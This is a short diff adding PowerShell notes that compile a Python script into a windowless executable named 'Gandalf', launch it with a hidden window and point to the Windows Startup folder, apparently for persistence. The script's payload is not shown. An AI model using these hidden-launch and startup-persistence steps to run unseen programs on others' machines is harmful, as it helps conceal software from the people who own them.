@@ -1,0 +1,11 @@
+#Load path
+cd (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
+
+#Compile to exe
+pyinstaller --noconfirm --onefile --windowed --name "Gandalf"  "main.py"
+
+#Start in background under powershell
+Start-Process "Gandalf.exe" -WindowStyle Hidden 
+
+#Add to folder
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
